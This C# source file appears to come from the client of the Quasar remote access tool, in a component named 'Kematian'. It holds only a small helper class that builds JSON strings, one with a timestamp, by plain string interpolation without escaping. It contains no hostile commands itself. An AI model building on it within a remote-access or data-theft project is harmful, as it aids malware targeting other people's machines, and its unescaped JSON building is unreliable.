using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Quasar.Client.Kematian.HelpingMethods
{
    public class JSONHandler
    {
        public static string MakeJson(string key, string value)
        {
            return $"{{\"{key}\":\"{value}\"}}";
        }

        public static string MakeJsonFile(string key, string value)
        {
            return $"{{\"{key}\":\"{value}\",\"time\":\"{DateTime.Now}\"}}";
        }


    }
}
